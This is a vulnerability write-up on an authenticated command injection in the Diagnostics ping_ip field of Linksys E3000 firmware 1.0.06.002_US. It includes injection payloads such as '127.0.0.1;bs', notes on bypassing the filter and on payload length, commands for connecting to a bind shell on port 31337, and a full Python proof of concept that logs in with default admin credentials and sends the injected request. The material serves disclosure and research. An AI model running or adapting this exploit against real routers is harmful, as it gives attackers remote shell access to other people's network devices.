# Information

**Vendor:** Cisco / Linksys

**Vendor website:** N/A (compiled from the local firmware sample and the existing single-finding writeup)

**Reported by:** local lab validation

**Affected products:** E3000

**Affected firmware version:** `1.0.06.002_US`

**Firmware sample filename:** `_FW_E3000_1.0.06.002_US_20140409_code.bin.extracted`

# Overview

The `ping_ip` parameter on the `Diagnostics` page is command-injectable. The frontend only performs a non-empty check, while the backend `rc` logic concatenates attacker-controlled input into a `ping` command and executes it through `system()`.

Current local validation confirms:

- `127.0.0.1;bs` reliably triggers the second stage
- the chain can spawn a `31337` bind shell
- this is a stable authenticated command-execution / RCE path

# Vulnerability details

1. Trigger chain:

```text
HTTP POST /apply.cgi -> submit_type=start_ping -> nvram ping_ip -> sbin/rc -> snprintf -> system
```

2. Key evidence:

- the frontend only checks whether the field is empty: `www/Diagnostics.asp:42-56`
- the `start_ping` button submits directly: `www/Diagnostics.asp:250`
- `sbin/rc` contains the following command template at string offset `0x9aa0c`

```text
ping -c %s -s %s -f %s %s &
```

- the target buffer size is `0x50` (80 bytes)
- the blacklist does not block `;`
- the final execution point is immediately before `system()`

3. Key code screenshot:

![ping code](../assets/ping_code.png)

4. Validated runtime behavior:

- captured command string:

```text
ping -c 5 -s 32 -f /tmp/ping.log 127.0.0.1;bs &
```

- confirmed `31337` bind shell startup
- confirmed real command output through the shell:

```text
$ HI
$ 
```

- confirmed that `bs` really executes:

```text
execve("/bin/sh", ["sh", "-c", "echo HI"], ...)
write(1, "HI\n", 3)
```

5. Retest on 2026-06-12:

- the full chain `Web write -> rc trigger -> 31337 interaction` still works
- in the current QEMU setup, `ping` itself may fail with `permission denied`, but that does not prevent `;bs` from being executed by the shell

6. Dynamic boundaries:

- `;bs` reliably spawns the shell
- `&bs` also works
- `&&bs` does not work in the current emulation because the preceding `ping` fails
- `$(bs)` reaches the final command string but did not spawn a shell in the current tests
- spaces, backticks, `|`, `/`, and `>` break the execution path
- if the goal is to preserve `;bs` intact, the practical upper bound is approximately:

```text
"A" * 43 + ";bs"
```

# POC

Direct POST:

```bash
python3 tools/e3000_apply.py --base http://127.0.0.1:8080 \
  --set submit_button=Diagnostics \
  --set change_action=gozila_cgi \
  --set gui_action=Apply \
  --set submit_type=start_ping \
  --set commit=0 \
  --set ping_ip='127.0.0.1;bs' \
  --set ping_size=32 \
  --set ping_times=5 \
  --set traceroute_ip=
```

Existing helper flow:

```bash
python3 tools/exploit_e3000_diag_ping.py --mode ping --payload '127.0.0.1;bs'
./tools/trigger_rc.sh
nc TARGET_IP 31337
```

Inline Python PoC:

```python
#!/usr/bin/env python3
import hashlib
import re
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar


BASE = "http://127.0.0.1:8080"
USER = "admin"
PASSWORD = "admin"
PAYLOAD = "127.0.0.1;bs"


def en_value(data: str) -> str:
    n = len(data)
    buf = data + (("0" + str(n)) if n < 10 else str(n))
    return hashlib.md5("".join(buf[i % (n + 2)] for i in range(64)).encode()).hexdigest()


def build_opener() -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CookieJar()))


def login(opener: urllib.request.OpenerDirector) -> str:
    page = opener.open(BASE + "/Router_Login.asp", timeout=10).read().decode("latin1", "ignore")
    nonce = re.search(r'var nonce = "([^"]*)"', page).group(1)
    passwd = en_value(en_value(PASSWORD) + nonce)
    body = urllib.parse.urlencode({
        "submit_button": "login",
        "change_action": "",
        "gui_action": "Apply",
        "wait_time": "19",
        "submit_type": "",
        "http_username": USER,
        "http_passwd": passwd,
    }).encode()
    req = urllib.request.Request(
        BASE + "/login.cgi",
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    opener.open(req, timeout=10).read()
    return nonce


def main() -> None:
    opener = build_opener()
    nonce = login(opener)
    body = urllib.parse.urlencode([
        ("submit_button", "Diagnostics"),
        ("change_action", "gozila_cgi"),
        ("gui_action", "Apply"),
        ("submit_type", "start_ping"),
        ("commit", "0"),
        ("ping_ip", PAYLOAD),
        ("ping_size", "32"),
        ("ping_times", "5"),
        ("traceroute_ip", ""),
    ]).encode()
    req = urllib.request.Request(
        BASE + "/apply.cgi;session_id=" + nonce,
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    resp = opener.open(req, timeout=15)
    print(f"[+] session_id={nonce}")
    print(f"[+] response_status={getattr(resp, 'status', 'unknown')}")
    print(f"[+] payload={PAYLOAD}")
    print("[+] next: nc TARGET_IP 31337")


if __name__ == "__main__":
    main()
```

# effect

This is a confirmed authenticated RCE chain:

1. the command injection reaches `system()`
2. the second stage is executable in the local emulation
3. the `31337` bind shell can be spawned and interacted with

Representative effect screenshot:

![ping effect](../assets/ping_effect.png)
